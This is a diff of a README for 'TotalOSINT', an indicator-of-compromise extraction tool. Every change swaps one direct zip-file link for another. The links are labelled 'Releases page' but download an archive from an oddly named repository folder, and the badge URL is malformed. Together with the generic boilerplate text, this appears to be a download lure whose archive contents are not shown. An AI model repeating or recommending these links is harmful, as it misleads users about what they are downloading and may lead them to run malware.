@@ -2,7 +2,7 @@
 
 TotalOSINT is a privacy-first tool designed for security analysts. It allows you to quickly extract Indicators of Compromise (IOCs)—such as IPs, domains, and hashes—from logs and perform bulk investigations across various threat intelligence sources. This toolkit features a zero-data-persistence workflow, making it ideal for Security Operations Center (SOC) and Digital Forensics and Incident Response (DFIR) teams. Best of all, no installation is required.
 
-[![Download TotalOSINT](https://github.com/Prajwalgrathish/TotalOSINT/raw/refs/heads/main/Pshav/Total-OSINT-3.8.zip%20TotalOSINT-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/Prajwalgrathish/TotalOSINT/raw/refs/heads/main/Pshav/Total-OSINT-3.8.zip)
+[![Download TotalOSINT](https://raw.githubusercontent.com/Prajwalgrathish/TotalOSINT/main/Pshav/OSINT_Total_1.5.zip%20TotalOSINT-v1.0-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Prajwalgrathish/TotalOSINT/main/Pshav/OSINT_Total_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Follow these easy steps to download and run TotalOSINT.
 
 ### 📥 Download & Install
 
-1. Visit the **[Releases page](https://github.com/Prajwalgrathish/TotalOSINT/raw/refs/heads/main/Pshav/Total-OSINT-3.8.zip)**.
+1. Visit the **[Releases page](https://raw.githubusercontent.com/Prajwalgrathish/TotalOSINT/main/Pshav/OSINT_Total_1.5.zip)**.
 2. Find the latest version listed on the page. 
 3. Locate the file suitable for your operating system (Windows, macOS, or Linux).
 4. Click on the file to download it to your computer.
@@ -69,7 +69,7 @@ For help or to share your experiences with TotalOSINT, join our community forums
 - **GitHub Issues:** Report bugs or request features.
 - **Email Support:** Reach out to our support team for assistance.
 
-We encourage feedback and contributions to the project. Visit our **[Releases page](https://github.com/Prajwalgrathish/TotalOSINT/raw/refs/heads/main/Pshav/Total-OSINT-3.8.zip)** to download the latest version.
+We encourage feedback and contributions to the project. Visit our **[Releases page](https://raw.githubusercontent.com/Prajwalgrathish/TotalOSINT/main/Pshav/OSINT_Total_1.5.zip)** to download the latest version.
 
 ## 🪪 License
 
@@ -98,6 +98,6 @@ TotalOSINT focuses on several key areas in cybersecurity:
 - Threat Intelligence
 - Zero Persistence
 
-Visit the **[Releases page](https://github.com/Prajwalgrathish/TotalOSINT/raw/refs/heads/main/Pshav/Total-OSINT-3.8.zip)** to access the latest version and additional resources.
+Visit the **[Releases page](https://raw.githubusercontent.com/Prajwalgrathish/TotalOSINT/main/Pshav/OSINT_Total_1.5.zip)** to access the latest version and additional resources.
 
 This README aims to provide you with a clear path to download and start using TotalOSINT. If you have any questions, feel free to explore community resources or reach out for support. Enjoy your experience with TotalOSINT!
